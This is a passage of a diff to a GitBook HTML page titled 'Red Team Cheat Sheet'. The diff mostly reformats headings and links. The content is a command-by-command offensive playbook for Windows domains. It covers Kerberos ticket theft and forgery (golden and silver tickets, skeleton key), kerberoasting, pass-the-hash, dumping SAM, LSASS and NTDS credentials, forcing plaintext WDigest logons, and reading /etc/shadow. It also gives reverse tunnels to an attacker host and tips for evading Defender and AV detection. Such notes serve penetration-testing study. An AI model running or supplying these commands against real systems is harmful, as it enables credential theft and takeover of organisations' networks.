-<p>[<a href="https://github.com/Greenwolf/ntlm\_theft\](https://github.com/Greenwolf/ntlm\_theft" target="_blank">https://github.com/Greenwolf/ntlm\_theft\](https://github.com/Greenwolf/ntlm\_theft</a>)</p>
+<p><a href="https://github.com/Greenwolf/ntlm_theft" target="_blank">https://github.com/Greenwolf/ntlm_theft</a></p>
 <p>ntlm_theft -s [attacker ip] -f [name] -g [all/url]</p>
 <p>hashcat -m 5600 [hashes] [wordlist]</p>
-<p># BloodHound</p>
-<p>[<a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html\](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html" target="_blank">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html\](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html</a>)</p>
-<p>### Collection</p>
+<h1 id="bloodhound">BloodHound</h1>
+<p><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html" target="_blank">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html</a></p>
+<h3 id="collection">Collection</h3>
 <p>○        SharpHound.exe -c [method] -d [domain] --exclude-dcs --zipfilename sharp.zip</p>
 <p>○        bloodhound-python -c [method] -d [domain] -u [username] -p [password] --hashes [hash] -ns [DC] --zip -v</p>
 <p>○        Invoke-Bloodhound (from SharpHound.ps1)</p>
@@ -1021,76 +1031,76 @@
 <p>●        on first run: CollectionMethod ⇒ All</p>
 <p>●        on subsequent runs (to get updated session info): CollectionMethod ⇒ Session</p>
 <p>○        in BloodHound, click Database Info → Clear Sessions</p>
-<p>### Analysis</p>
+<h3 id="analysis">Analysis</h3>
 <p>●        neo4j console</p>
 <p>●        bloodhound --no-sandbox</p>
 <p>MATCH (m:Computer) RETURN m</p>
 <p>MATCH (m:User) RETURN m</p>
-<p># Kerberos</p>
+<h1 id="kerberos">Kerberos</h1>
 <p>Kerberos Authentication</p>
-<p>![](file:///C:/Users/gsdav/AppData/Local/Packages/oice_16_974fa576_32c1d314_117e/AC/Temp/msohtmlclip1/01/clip_image002.gif)</p>
+<p>!<a href="file:///C:/Users/gsdav/AppData/Local/Packages/oice_16_974fa576_32c1d314_117e/AC/Temp/msohtmlclip1/01/clip_image002.gif" target="_blank"></a></p>
 <p>AS_REP ⇒ provides TGT ⁠– ticket to get other service tickets</p>
 <p>●        you can only have one TGT</p>
 <p>TGS_REP ⇒ provides TGS – ticket to get access to specific service</p>
-<p>## Ticket Conversion</p>
+<h2 id="ticket-conversion">Ticket Conversion</h2>
 <p>Converting tickets between impacket and mimikatz/Rubeus format</p>
 <p>kirbi2ccache [kirbi file] [ccache file]</p>
 <p>ccache2kirbi [ccache file] [kirbi file]</p>
 <p>impacket-ticketConverter [ccache/kirbi file] [kirbi/ccache file]</p>
 <p>●        kirbi ⇒ mimikatz</p>
 <p>●        ccache ⇒ impacket</p>
-<p>## Request New Initial TGT</p>
-<p>**Note:** requires user’s password or hash</p>
-<p>**Rubeus**</p>
+<h2 id="request-new-initial-tgt">Request New Initial TGT</h2>
+<p><strong>Note:</strong> requires user’s password or hash</p>
+<p><strong>Rubeus</strong></p>
 <p>rubeus asktgt /domain: /user: /password:</p>
 <p>●        /enctype:[rc4|aes128|aes256|3des]</p>
 <p>○        use aes256 (default) for enctype</p>
 <p>●        if you don’t have password but have hash, replace /password: with /rc4: /aes128: /aes256: or /des:</p>
-<p>**Mimikatz**</p>
+<p><strong>Mimikatz</strong></p>
 <p>tgt::ask /domain: /user: /password:</p>
-<p>**Impacket** (Remote)</p>
+<p><strong>Impacket</strong> (Remote)</p>
 <p>impacket-getTGT [domain]/[user]:[password]</p>
 <p>●        -dc-ip [DC]</p>
 <p>●        -hashes [hash]</p>
 <p>export KRB5CCNAME=[ticket].ccache</p>
-<p>## Request Delegated TGT</p>
-<p>_can’t change passwords with delegated TGTs but can request TGSes_</p>
-<p>**Notes:**</p>
+<h2 id="request-delegated-tgt">Request Delegated TGT</h2>
+<p><em>can’t change passwords with delegated TGTs but can request TGSes</em></p>
+<p><strong>Notes:</strong></p>
 <p>●        domain controllers by default can provide delegated TGTs</p>
 <p>●        normal for some processes (like explorer) but weird for others (like notepad). For processes that it’s weird, if you don’t want to get flagged by Windows Defender be sure to use /host</p>
 <p>●        useful for using impacket scripts without knowing password → convert ticket to ccache</p>
-<p>**Rubeus**</p>
+<p><strong>Rubeus</strong></p>
 <p>rubeus tgtdeleg</p>
 <p>●        /target:[SPN]</p>
-<p>**Mimikatz**</p>
+<p><strong>Mimikatz</strong></p>
 <p>tgt::deleg ⇒ contacts domain controller by default</p>
 <p>●        /host:[FQDN] ⇒ have another host delegate for you (stealthy)</p>
 <p>○        find with Get-AdComputer -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"</p>
-<p>## Request TGS</p>
-<p>**Rubeus**</p>
+<h2 id="request-tgs">Request TGS</h2>
+<p><strong>Rubeus</strong></p>
 <p>rubeus asktgs /service:[SPN]/[FQDN]</p>
 <p>●        To impersonate another user (same as request TGT):</p>
 <p>○        /enctype:</p>
 <p>○        /user:[username]</p>
 <p>○        /password:[password]</p>
 <p>■        if you don’t have password but have hash, replace /password: with /rc4: /aes128: /aes256: or /des:</p>
-<p>**Mimikatz**</p>
+<p><strong>Mimikatz</strong></p>
 <p>kerberos::ask /target:[SPN]/[FQDN]</p>
 <p>●        Optional /export to export</p>
-<p>**Impacket** (Remote)</p>
+<p><strong>Impacket</strong> (Remote)</p>
 <p>impacket-getST [domain]/[user]:[password] -spn [service]/[host]</p>
 <p>●        -dc-ip [DC]</p>
 <p>●        -hashes [hash]</p>
 <p>●        -impersonate [user]</p>
-<p>**Note:** Automatically modifies impersonate TGS so it can be used with other impacket tools.</p>
-<p>## Modify Existing TGS for Another Service</p>
-<p>**Rubeus**</p>
+<p><strong>Note:</strong> Automatically modifies impersonate TGS so it can be used with other impacket tools.</p>
+<h2 id="modify-existing-tgs-for-another-service">Modify Existing TGS for Another Service</h2>
+<p><strong>Rubeus</strong></p>
 <p>rubeus asktgs /altservice:[SPN] /ticket:[ticket]</p>
 <p>●        /ptt will automatically load onto current logon session</p>
-<p>**Impacket** (Remote)</p>
+<p><strong>Impacket</strong> (Remote)</p>
 <p>See note above. Realistically, this is only used in constrained delegation attacks so look there.</p>
-<p>## Harvest Tickets</p>
-<p>**Rubeus**</p>
+<h2 id="harvest-tickets">Harvest Tickets</h2>
+<p><strong>Rubeus</strong></p>
 <p>rubeus harvest /interval:30 ⇒ list current session TGT</p>
 <p>●        interval: time between harvests (seconds)</p>
 <p>rubeus triage ⇒ list current session all tickets with logon id and expiration time</p>
@@ -1100,48 +1110,48 @@
 <p>●        /service:[service] for a specific service</p>
 <p>●        /luid:[logon id] for specific session, if we have access to all sessions (admin)</p>
 <p>●        /nowrap ⇒ easier copy-and-paste</p>
-<p>**Mimikatz**</p>
+<p><strong>Mimikatz</strong></p>
 <p>kerberos::tgt ⇒ list current session TGT</p>
 <p>kerberos::list ⇒ list current session all tickets</p>
 <p>sekurlsa::tickets ⇒ list all tickets for all sessions but injects into LSASS memory so don’t do it if there’s a monitoring service</p>
 <p>●        add /export to any of these to export but first base64 /out:true and base64 /in:true to export base64 encoded (less likely to be detected)</p>
-<p>## Harvest Keys</p>
-<p>**Mimikatz**</p>
+<h2 id="harvest-keys">Harvest Keys</h2>
+<p><strong>Mimikatz</strong></p>
 <p>sekurlsa::ekeys</p>
-<p>## Purge Tickets</p>
-<p>**Rubeus**</p>
+<h2 id="purge-tickets">Purge Tickets</h2>
+<p><strong>Rubeus</strong></p>
 <p>rubeus purge</p>
-<p>**Mimikatz**</p>
+<p><strong>Mimikatz</strong></p>
 <p>kerberos::purge</p>
-<p># Pass-the-Key (PTK)/Overpass-the-Hash (OPTH)</p>
+<h1 id="pass-the-key-ptkoverpass-the-hash-opth">Pass-the-Key (PTK)/Overpass-the-Hash (OPTH)</h1>
 <p>pass-the-key or pass-the-hash to obtain a TGT</p>
-<p>**Rubeus**</p>
+<p><strong>Rubeus</strong></p>
 <p>rubeus asktgt /domain:[domain] /user:[user] /rc4:[hash] /ptt</p>
-<p>**Mimikatz**</p>
+<p><strong>Mimikatz</strong></p>
 <p>sekurlsa::pth /user:[user] /domain:[domain] /rc4:[hash]</p>
 <p>●        /run:[cmd.exe OR powershell.exe]</p>
-<p>**Impacket** (Remote)</p>
+<p><strong>Impacket</strong> (Remote)</p>
 <p>impacket-getTGT [domain]/[user]:[password]</p>
 <p>●        -dc-ip [DC]</p>
 <p>●        -hashes [hash]</p>
 <p>export KRB5CCNAME=[ticket].ccache</p>
-<p># Pass-the-Ticket (PTT)</p>
-<p>**Note:** can either pass the TGT or pass the TGS</p>
-<p>●        dump the ticket to be passed (_see_ [_Harvest Tickets_](#_9267jzhnvwqm) _above_)</p>
+<h1 id="pass-the-ticket-ptt">Pass-the-Ticket (PTT)</h1>
+<p><strong>Note:</strong> can either pass the TGT or pass the TGS</p>
+<p>●        dump the ticket to be passed (<em>see</em> <a href="#_9267jzhnvwqm"><em>Harvest Tickets</em></a> <em>above</em>)</p>
 <p>○        for Mimikatz, export tickets with sekurlsa::tickets /export</p>
-<p>**Rubeus**</p>
+<p><strong>Rubeus</strong></p>
 <p>rubeus ptt /ticket:[ticket]</p>
-<p>**Mimikatz**</p>
+<p><strong>Mimikatz</strong></p>
 <p>kerberos::ptt [ticket]</p>
 <p>●        verify with klist ⇒ list cached tickets</p>
-<p>**Impacket**</p>
+<p><strong>Impacket</strong></p>
 <p>export KRB5CCNAME=[ticket].ccache</p>
-<p># Golden/Silver Ticket</p>
-<p>**Golden Ticket:** create forged TGT for domain admin using admin’s hash</p>
-<p>**Silver Ticket:** create forged TGS for service using service’s hash ⇒ useful for impersonating users when logging into a service</p>
+<h1 id="goldensilver-ticket">Golden/Silver Ticket</h1>
+<p><strong>Golden Ticket:</strong> create forged TGT for domain admin using admin’s hash</p>
+<p><strong>Silver Ticket:</strong> create forged TGS for service using service’s hash ⇒ useful for impersonating users when logging into a service</p>
 <p>●        same effect as requesting a TGT or TGS, but without communicating with the domain controller</p>
 <p>●        you can create it for any user, even one that doesn’t exist</p>
-<p>**Mimikatz**</p>
+<p><strong>Mimikatz</strong></p>
 <p>Domain SID:</p>
 <p>wmic useraccount get name,sid</p>
 <p>Current Realm:</p>
@@ -1158,7 +1168,7 @@
 <p>●        sids ⇒ enterprise admin group SID</p>
 <p>●        user and id can be whatever you want them to be</p>
 <p>○        /user:Administrator /id:500 for golden ticket</p>
-<p>**Impacket**</p>
+<p><strong>Impacket</strong></p>
 <p>Domain SID:</p>
 <p>impacket-getPac -targetUser Administrator [domain]/[user]:[password]</p>
 <p>crackmapexec ldap [DC] -u [user] -p [password] -k --get-sid</p>
@@ -1168,81 +1178,81 @@
 <p>●        -spn [SPN] for silver ticket</p>
 <p>export KRB5CCNAME=[ticket].ccache</p>
 <p>Inter-Realm:</p>
-<p>**Manually**</p>
+<p><strong>Manually</strong></p>
 <p>impacket-ticketer -domain [domain] -domain-sid [SID] -nthash [krbtgt hash] -spn krbtgt -extra-sid [enterprise admin group SID]</p>
 <p>export KRB5CCNAME=[ticket].ccache</p>
-<p>**Automatically**</p>
+<p><strong>Automatically</strong></p>
 <p>impacket-raiseChild [domain]/[user]:[password]</p>
 <p>●        -w [ticket] ⇒ write out golden ticket</p>
 <p>●        -target-exec [host] ⇒ psexec to host after compromise</p>
-<p># Skeleton Key</p>
+<h1 id="skeleton-key">Skeleton Key</h1>
 <p>used to access any SMB share with the same password</p>
 <p>●        misc::skeleton</p>
 <p>○        default password is mimikatz</p>
-<p>●        _see_ [_Interacting with SMB_](<a href="https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X\_eibU\_4B0/edit\#heading=h.vexfc5fk3uaj" target="_blank">https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X\_eibU\_4B0/edit\#heading=h.vexfc5fk3uaj</a>) _above_</p>
-<p># AS-REP Roasting</p>
-<p>### Obtaining Hash</p>
-<p>**Rubeus**</p>
+<p>●        <em>see</em> <a href="https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X_eibU_4B0/edit#heading=h.vexfc5fk3uaj" target="_blank"><em>Interacting with SMB</em></a> <em>above</em></p>
+<h1 id="as-rep-roasting">AS-REP Roasting</h1>
+<h3 id="obtaining-hash">Obtaining Hash</h3>
+<p><strong>Rubeus</strong></p>
 <p>rubeus asreproast /format:[hashcat/john] /outfile:hashes.txt</p>
-<p>**Impacket**</p>
+<p><strong>Impacket</strong></p>
 <p>impacket-GetNPUsers [domain]/[user]:[password]</p>
 <p>●        -dc-ip [DC]</p>
 <p>●        -hashes [hash]</p>
 <p>●        without creds (don’t provide [user]:[password]) ⇒ -usersfile [usernames]</p>
 <p>●        -request -format [hashcat/john] -outputfile hashes.txt</p>
-<p>### Cracking</p>
+<h3 id="cracking">Cracking</h3>
 <p>hashcat -m 18200 hashes.txt [wordlist]</p>
 <p>john hashes.txt --wordlist [wordlist]</p>
-<p># Kerberoasting (TGS-REP Roasting)</p>
-<p>**Note:** requires access to any user account on the domain</p>
-<p>### Obtaining Hash</p>
-<p>**Rubeus**</p>
+<h1 id="kerberoasting-tgs-rep-roasting">Kerberoasting (TGS-REP Roasting)</h1>
+<p><strong>Note:</strong> requires access to any user account on the domain</p>
+<h3 id="obtaining-hash">Obtaining Hash</h3>
+<p><strong>Rubeus</strong></p>
 <p>rubeus kerberoast /outfile:hashes.txt</p>
-<p>**Impacket**</p>
+<p><strong>Impacket</strong></p>
 <p>impacket-GetUserSPNs [domain]/[user]:[password]</p>
 <p>●        -dc-ip [DC]</p>
 <p>●        -hashes [hash]</p>
 <p>●        -request-user [SPN]</p>
 <p>●        -request -outputfile hashes.txt</p>
-<p>### Cracking</p>
+<h3 id="cracking">Cracking</h3>
 <p>hashcat -m 13100 hashes.txt [wordlist]</p>
 <p>john hashes.txt --wordlist [wordlist]</p>
-<p># Constrained Delegation</p>
-<p>### Check for Constrained Delegation</p>
+<h1 id="constrained-delegation">Constrained Delegation</h1>
+<h3 id="check-for-constrained-delegation">Check for Constrained Delegation</h3>
 <p>Get-Net[User/Computer] -TrustedToAuth | Select name,msds-allowedtodelegateto,useraccountcontrol</p>
 <p>Get-Net[User/Computer] [name] | Select-Object -ExpandProperty msds-allowedtodelegateto</p>
 <p>impacket-findDelegation [domain]/[user]:[password]</p>
-<p>### Exploit Constrained Delegation</p>
+<h3 id="exploit-constrained-delegation">Exploit Constrained Delegation</h3>
 <p>impacket-getST -spn [service]/[host] -impersonate [user to impersonate] [domain]/[user]:[password]</p>
 <p>export KRB5CCNAME=[ticket].ccache</p>
 <p>You can also use Rubeus:</p>
 <p>8. Request TGT for service<br></br>9. Request TGS on behalf of user (Rubeus s4u)<br></br>10. Modify existing TGS for another service (like cifs)<br></br>11. Load TGS</p>
 <p>However, this is probably a waste of your time since impacket does this in one command.</p>
-<p># WDigest Plaintext Logon Credentials</p>
+<h1 id="wdigest-plaintext-logon-credentials">WDigest Plaintext Logon Credentials</h1>
 <p>●        reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 ⇒ force WDigest to store logon credentials in plaintext</p>
 <p>●        wait for user to log in</p>
 <p>●        sekurlsa::wdigest ⇒ check for plaintext passwords</p>
-<p># Group Policy Preferences (GPP)</p>
-<p>**Note:** patched in MS14-025</p>
-<p>**Locally**</p>
+<h1 id="group-policy-preferences-gpp">Group Policy Preferences (GPP)</h1>
+<p><strong>Note:</strong> patched in MS14-025</p>
+<p><strong>Locally</strong></p>
 <p>12. C:\Windows\SYSVOL\Preferences\Groups\Groups.xml on domain controller<br></br>13. copy cpassword from cpassword annotation<br></br>14. gpp-decrypt [cpassword]</p>
-<p>**Impacket**</p>
+<p><strong>Impacket</strong></p>
 <p>impacket-Get-GPPPassword [domain]/[user]:[password]@[DC]</p>
 <p>●        -xmlfile [Groups.xml file] local ⇒ parse local xml file</p>
 <p>Pivoting</p>
-<p>[<a href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/\](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/" target="_blank">https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/\](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/</a>)</p>
-<p># Dumping Hashes</p>
-<p>## Linux</p>
+<p><a href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/" target="_blank">https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/</a></p>
+<h1 id="dumping-hashes">Dumping Hashes</h1>
+<h2 id="linux">Linux</h2>
 <p>●        cat /etc/passwd ⇒ users</p>
 <p>●        cat /etc/shadow ⇒ password hashes</p>
 <p>●        unshadow /etc/passwd /etc/shadow &gt; hashes.txt ⇒ combine for hash cracking</p>
-<p>## Windows</p>
-<p>[<a href="https://www.thehacker.recipes/ad/movement/credentials/dumping\](https://www.thehacker.recipes/ad/movement/credentials/dumping" target="_blank">https://www.thehacker.recipes/ad/movement/credentials/dumping\](https://www.thehacker.recipes/ad/movement/credentials/dumping</a>)</p>
+<h2 id="windows">Windows</h2>
+<p><a href="https://www.thehacker.recipes/ad/movement/credentials/dumping" target="_blank">https://www.thehacker.recipes/ad/movement/credentials/dumping</a></p>
 <p>Hashes are stored in three places:</p>
 <p>●        SAM ⇒ local user accounts</p>
 <p>●        LSA ⇒ domain user accounts</p>
 <p>●        NTDS.dit ⇒ everyone on domain (DC only)</p>
-<p>### Locally</p>
+<h3 id="locally">Locally</h3>
 <p>reg save HKLM\SAM "C:\Windows\Temp\sam.save"</p>
 <p>reg save HKLM\SECURITY "C:\Windows\Temp\security.save"</p>
 <p>reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"</p>
@@ -1250,7 +1260,7 @@
 <p>procdump -accepteula -ma lsass.exe lsass.dmp</p>
 <p>Control Panel → User Accounts → Credential Manager</p>
 <p>powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"</p>
-<p>### Mimikatz</p>
+<h3 id="mimikatz">Mimikatz</h3>
 <p>●        token::elevate</p>
 <p>●        privilege::debug</p>
 <p>●        lsadump::sam /patch ⇒ SAM hashes</p>
@@ -1264,32 +1274,32 @@
 <p>●        sekurlsa::credman ⇒ hashes in Windows Credential Manager</p>
 <p>●        lsadump::dcsync /domain:[domain] /all /csv ⇒ NTDS.dit</p>
 <p>○        equivalent of -just-dc in impacket-secretsdump</p>
-<p>### Impacket</p>
+<h3 id="impacket">Impacket</h3>
 <p>●        impacket-secretsdump [domain]/[user]:[password]@[host]</p>
 <pre><code>            OR
 </code></pre><p>●        impacket-secretsdump [domain]/[user]@[host] -hashes [hash]</p>
-<p>_Flags:_</p>
+<p><em>Flags:</em></p>
 <p>●        -just-dc ⇒ only NTDS.dit data (NTLM hashes and Kerberos keys)</p>
 <p>●        -just-dc-ntlm ⇒ only NTDS.dit data (NTLM hashes only)</p>
 <p>●        -sam [SAM file] -system [SYSTEM file] -security [SECURITY file] local ⇒ dump directly from SAM</p>
 <p>●        -ntds [NTDS file] -system [SYSTEM file] -security [SECURITY file] local ⇒ dump directly from NTDS</p>
 <p>●        -no-pass ⇒ don’t prompt for password (used with -k)</p>
 <p>●        -k [ccache file] ⇒ use kerberos ticket</p>
-<p>### CrackMapExec</p>
+<h3 id="crackmapexec">CrackMapExec</h3>
 <p>crackmapexec smb [host] -u [username] -p [password] [--sam/--lsa/--ntds]</p>
-<p># Pass-the-Hash (PTH)</p>
-<p>[<a href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/\](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/" target="_blank">https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/\](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/</a>)</p>
-<p>**Note:** Hash is in the form [LM hash]:[NT hash] unless otherwise stated. LM hash can also be either empty or 32 zeros in most cases.</p>
-<p>### Mimikatz</p>
+<h1 id="pass-the-hash-pth">Pass-the-Hash (PTH)</h1>
+<p><a href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/" target="_blank">https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/</a></p>
+<p><strong>Note:</strong> Hash is in the form [LM hash]:[NT hash] unless otherwise stated. LM hash can also be either empty or 32 zeros in most cases.</p>
+<h3 id="mimikatz">Mimikatz</h3>
 <p>●        token::revert</p>
 <p>●        sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[NT hash] /run:"[command]"</p>
-<p>### CrackMapExec</p>
+<h3 id="crackmapexec">CrackMapExec</h3>
 <p>●        crackmapexec [protocol] [host] -d [domain] -u [user] -H [NT hash] -x [command]</p>
 <p>○        Can use --local-auth instead of -d</p>
 <p>○        -t [threads]</p>
 <p>○        --verbose</p>
 <p>crackmapexec [protocol] -h for more info</p>
-<p>**Protocols:**</p>
+<p><strong>Protocols:</strong></p>
 <p>●        FTP</p>
 <p>●        RDP</p>
 <p>●        MSSQL</p>
@@ -1297,8 +1307,8 @@
 <p>●        LDAP</p>
 <p>●        SSH</p>
 <p>●        WinRM</p>
-<p>### Impacket</p>
-<p>Note: If you have a Kerberos ticket, you can omit -hashes and use -k -no-pass instead. _See_ [_Request New Initial TGT_](<a href="https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X\_eibU\_4B0/edit\#heading=h.8zkfly6nu0pz" target="_blank">https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X\_eibU\_4B0/edit\#heading=h.8zkfly6nu0pz</a>) _or_ [_Request Delegated TGT_](<a href="https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X\_eibU\_4B0/edit\#heading=h.n3l1v6yyohv" target="_blank">https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X\_eibU\_4B0/edit\#heading=h.n3l1v6yyohv</a>) _above_.</p>
+<h3 id="impacket">Impacket</h3>
+<p>Note: If you have a Kerberos ticket, you can omit -hashes and use -k -no-pass instead. <em>See</em> <a href="https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X_eibU_4B0/edit#heading=h.8zkfly6nu0pz" target="_blank"><em>Request New Initial TGT</em></a> <em>or</em> <a href="https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X_eibU_4B0/edit#heading=h.n3l1v6yyohv" target="_blank"><em>Request Delegated TGT</em></a> <em>above</em>.</p>
 <p>●        Be sure to modify relevant sections of /etc/krb5.conf: domain_realm and realms</p>
 <p>impacket-smbclient [domain]/[user]:[password]@[host]</p>
 <p>impacket-smbexec [domain]/[user]:[password]@[host]</p>
@@ -1320,30 +1330,30 @@
 <p>impacket-rpcdump</p>
 <p>impacket-samrdump</p>
 <p>impacket-addcomputer</p>
-<p>### Metasploit Modules</p>
+<h3 id="metasploit-modules">Metasploit Modules</h3>
 <p>●        exploit/windows/smb/psexec</p>
 <p>○        “Use custom templates or MOF upload method to circumvent AV detection”</p>
 <p>●        auxiliary/admin/smb/psexec_command</p>
 <p>●        exploit/windows/local/current_user_psexec</p>
 <p>Port Redirection/Tunnelling</p>
-<p># SSH</p>
-<p>[<a href="https://youtu.be/JKrO5WABdoY\](https://youtu.be/JKrO5WABdoY" target="_blank">https://youtu.be/JKrO5WABdoY\](https://youtu.be/JKrO5WABdoY</a>)</p>
+<h1 id="ssh">SSH</h1>
+<p><a href="https://youtu.be/JKrO5WABdoY" target="_blank">https://youtu.be/JKrO5WABdoY</a></p>
 <p>A device has access to a port I want.</p>
 <p>ssh [device I’m connecting to that has what I want – user@ip] -p [port to ssh to that device on – 22] -L [what port of mine I want it on]:[what I want – ip:port]</p>
 <p>I have access to a port a device wants.</p>
 <p>ssh [device I’m connecting to that wants what I have – user@ip] -p [port to ssh to that device on – 22] -R [what port of theirs they want it on]:[what they want – ip:port]</p>
-<p># ProxyChains</p>
-<p>### SSH</p>
+<h1 id="proxychains">ProxyChains</h1>
+<h3 id="ssh">SSH</h3>
 <p>From target (SSH server on attacker): ssh -fN -R [port] root@[attacker]</p>
 <p>From attacker (SSH server on target): ssh -fN -D [port] [user]@[target]</p>
-<p>### Chisel</p>
+<h3 id="chisel">Chisel</h3>
 <p>On attacker: chisel server -p 8000 --socks5 --reverse</p>
 <p>On target: chisel client [attacker]:8000 R:socks</p>
 <p>edit /etc/proxychains.conf</p>
 <p>...</p>
 <p>socks5    [host] 1080</p>
 <p>proxychains [command to execute on target]</p>
-<p>### Ligolo-ng</p>
+<h3 id="ligolo-ng">Ligolo-ng</h3>
 <p>Prep (on attacker):</p>
 <p>ip tuntap add user [user] mode tun ligolo</p>
 <p>ip link set ligolo up</p>
@@ -1354,9 +1364,9 @@
 <p>start</p>
 <p>listener_add --addr 0.0.0.0:[target port] --to 127.0.0.1:[kali port] --tcp</p>
 <p>Hash Cracking</p>
-<p>[CrackStation](<a href="https://crackstation.net" target="_blank">https://crackstation.net</a>)</p>
-<p># Wordlist Generation</p>
-<p>## Crunch</p>
+<p><a href="https://crackstation.net" target="_blank">CrackStation</a></p>
+<h1 id="wordlist-generation">Wordlist Generation</h1>
+<h2 id="crunch">Crunch</h2>
 <p>crunch [minimum num characters] [maximum num characters] [characters] -t [pattern] -b [max filesize] -o [filename] -p (no repeating characters) or -p [word1] [word2]... (mix words no repeat)</p>
 <p>●        pattern:</p>
 <p>○        @ ⇒ lowercase letters</p>
@@ -1367,12 +1377,12 @@
 <p>●        search charsets using cat /usr/share/crunch/charset.lst</p>
 <p>man crunch for more info</p>
 <p>●        example: crunch 6 6 0123456789ABCDEF -o crunch1.txt</p>
-<p>## Cewl</p>
+<h2 id="cewl">Cewl</h2>
 <p>cewl [base URL] -m [min word length] -d [crawl depth] -w [output file] --with-numbers</p>
-<p># Identification</p>
-<p>[hash examples](<a href="https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401" target="_blank">https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401</a>)</p>
+<h1 id="identification">Identification</h1>
+<p><a href="https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401" target="_blank">hash examples</a></p>
 <p>hash-identifier</p>
-<p># HashCat</p>
+<h1 id="hashcat">HashCat</h1>
 <p>hashcat -m [type] [hashes] [wordlist]</p>
 <p>hashcat -m [type] -a 3 [hashes] [mask (optional)]</p>
 <p>●        ?l ⇒ lowercase letters</p>
@@ -1381,17 +1391,17 @@
 <p>●        ?s ⇒ special characters</p>
 <p>●        ?a ⇒ all of the above</p>
 <p>●        ?b ⇒ yucky bytes (null, etc.)</p>
-<p>**Windows NTLM:** -m 1000</p>
-<p>### Rules</p>
-<p>[<a href="https://hashcat.net/wiki/doku.php?id=rule\_based\_attack\](https://hashcat.net/wiki/doku.php?id=rule\_based\_attack" target="_blank">https://hashcat.net/wiki/doku.php?id=rule\_based\_attack\](https://hashcat.net/wiki/doku.php?id=rule\_based\_attack</a>)</p>
+<p><strong>Windows NTLM:</strong> -m 1000</p>
+<h3 id="rules">Rules</h3>
+<p><a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack" target="_blank">https://hashcat.net/wiki/doku.php?id=rule_based_attack</a></p>
 <p>/usr/share/hashcat/rules</p>
 <p>hashcat -r [file].rule --stdout [wordlist]</p>
 <p>hashcat -r [file].rule …</p>
-<p># John</p>
+<h1 id="john">John</h1>
 <p>unshadow /etc/passwd /etc/shadow &gt; [hashlist]</p>
 <p>john [hashes] --format=[type] --wordlist=[wordlist]</p>
 <p>rm /etc/john/john.pot</p>
-<p>### Rules</p>
+<h3 id="rules">Rules</h3>
 <p>/etc/john/john.conf has all rules</p>
 <p>●        add section with [List.Rules:rulename] followed by hashcat style rules</p>
 <p>john --rules=[rulename]</p>
@@ -1434,7 +1444,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Red Team Cheat Sheet","level":"4.1.1","depth":2,"previous":{"title":"Tools I Use","level":"4.1","depth":1,"path":"resources/tools.md","ref":"resources/tools.md","articles":[{"title":"Red Team Cheat Sheet","level":"4.1.1","depth":2,"path":"resources/redteamcheatsheet.md","ref":"resources/redteamcheatsheet.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"resources/redteamcheatsheet.md","mtime":"2026-02-26T22:45:07.389Z","type":"markdown"},"gitbook":{"version":"6.1.6","time":"2026-02-26T22:45:11.251Z"},"basePath":"..","book":{"language":""}});
